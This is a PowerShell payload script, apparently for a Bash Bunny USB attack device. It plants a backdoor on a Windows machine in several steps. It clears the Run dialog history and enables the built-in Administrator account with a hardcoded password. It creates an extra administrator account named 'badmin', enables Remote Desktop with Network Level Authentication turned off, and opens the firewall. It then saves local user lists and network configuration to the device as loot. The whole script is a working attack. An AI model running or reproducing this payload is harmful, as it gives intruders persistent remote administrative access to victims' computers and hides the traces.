# Vars for log
$destFile = ("$env:COMPUTERNAME-{0:yyyy-MM-dd-HH-mm-ss}.log" -f (Get-Date))
$destPath = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\badmin')
$dest = "$destPath\$destFile"

# Vars for user stuff
$NUser = "badmin"
$Password = convertto-securestring "th!s15@planetbanna" -asplaintext -force
$Group = "Administrators"

# Clear Run history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue

# Enable admin account and set pw
Enable-LocalUser -Name Administrator -ErrorAction SilentlyContinue
Set-LocalUser -Name Administrator -PasswordNeverExpires $true -Password $Password -ErrorAction SilentlyContinue

# Create new user and make admin
New-LocalUser $NUser -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
Add-LocalGroupMember $Group $NUser -ErrorAction SilentlyContinue

# Enable RDP
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0 -ErrorAction SilentlyContinue
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -Value 0 -ErrorAction SilentlyContinue
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue

# Log things now
$rdpenabled = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" | Select-Object -expandProperty fDenyTSConnections
If ($rdpenabled -eq 0)
{
    Add-Content -Path $dest -Value "$(Get-Date -Format G) RDP enabled: success"
}

Else
{
    Add-Content -Path $dest -Value "$(Get-Date -Format G) RDP enabled: fail"
}

$rdpinsecure = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" | Select-Object -expandProperty UserAuthentication
If ($rdpinsecure -eq 0)
{
    Add-Content -Path $dest -Value "$(Get-Date -Format G) NLA disabled: success"
}

Else
{
    Add-Content -Path $dest -Value "$(Get-Date -Format G) NLA disabled: fail"
}

Add-Content -Path $dest -Value "$(Get-Date -Format G) RDP group firewall rules status:"
Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Select-Object DisplayName, Enabled | Out-File -Append -FilePath $dest -Encoding ASCII
Add-Content -Path $dest -Value "$(Get-Date -Format G) Local users:"
Get-LocalUser | Out-File -Append -FilePath $dest -Encoding ASCII
Add-Content -Path $dest -Value "$(Get-Date -Format G) IP Config /all"
& ipconfig /all | Out-File -Append -FilePath $dest -Encoding ASCII
Add-Content -Path $dest -Value ""
Add-Content -Path $dest -Value "Have a nice day ;)"
